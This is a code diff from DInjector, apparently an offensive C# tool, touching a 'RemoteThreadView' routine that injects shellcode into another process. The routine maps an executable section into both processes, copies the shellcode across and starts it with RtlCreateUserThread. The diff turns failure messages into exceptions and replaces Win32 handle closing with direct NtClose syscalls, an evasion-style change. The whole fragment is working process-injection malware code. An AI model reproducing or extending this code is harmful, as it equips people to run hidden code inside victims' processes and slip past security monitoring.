@@ -25,7 +25,7 @@ namespace DInjector
             if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadView) [+] NtOpenProcess");
             else
-                Console.WriteLine($"(RemoteThreadView) [-] NtOpenProcess: {ntstatus}");
+                throw new Exception($"(RemoteThreadView) [-] NtOpenProcess: {ntstatus}");
 
             #endregion
 
@@ -48,7 +48,7 @@ namespace DInjector
             if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadView) [+] NtCreateSection, PAGE_EXECUTE_READWRITE");
             else
-                Console.WriteLine($"(RemoteThreadView) [-] NtCreateSection, PAGE_EXECUTE_READWRITE: {ntstatus}");
+                throw new Exception($"(RemoteThreadView) [-] NtCreateSection, PAGE_EXECUTE_READWRITE: {ntstatus}");
 
             #endregion
 
@@ -76,7 +76,7 @@ namespace DInjector
             if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadView) [+] NtMapViewOfSection, PAGE_READWRITE");
             else
-                Console.WriteLine($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_READWRITE: {ntstatus}");
+                throw new Exception($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_READWRITE: {ntstatus}");
 
             #endregion
 
@@ -103,7 +103,7 @@ namespace DInjector
             if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadView) [+] NtMapViewOfSection, PAGE_EXECUTE_READ");
             else
-                Console.WriteLine($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_EXECUTE_READ: {ntstatus}");
+                throw new Exception($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_EXECUTE_READ: {ntstatus}");
 
             // Copy the shellcode into the locally mapped view which will be reflected on the remotely mapped view
             Marshal.Copy(shellcode, 0, lbaseAddress, shellcode.Length);
@@ -131,7 +131,7 @@ namespace DInjector
             if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadView) [+] RtlCreateUserThread");
             else
-                Console.WriteLine($"(RemoteThreadView) [-] RtlCreateUserThread: {ntstatus}");
+                throw new Exception($"(RemoteThreadView) [-] RtlCreateUserThread: {ntstatus}");
 
             #endregion
 
@@ -144,12 +144,12 @@ namespace DInjector
             if (ntstatus == NTSTATUS.Success)
                 Console.WriteLine("(RemoteThreadView) [+] NtUnmapViewOfSection");
             else
-                Console.WriteLine($"(RemoteThreadView) [-] NtUnmapViewOfSection: {ntstatus}");
+                throw new Exception($"(RemoteThreadView) [-] NtUnmapViewOfSection: {ntstatus}");
 
             #endregion
 
-            Win32.CloseHandle(hSection);
-            Win32.CloseHandle(rhProcess);
+            Syscalls.NtClose(hSection);
+            Syscalls.NtClose(rhProcess);
         }
     }
 }
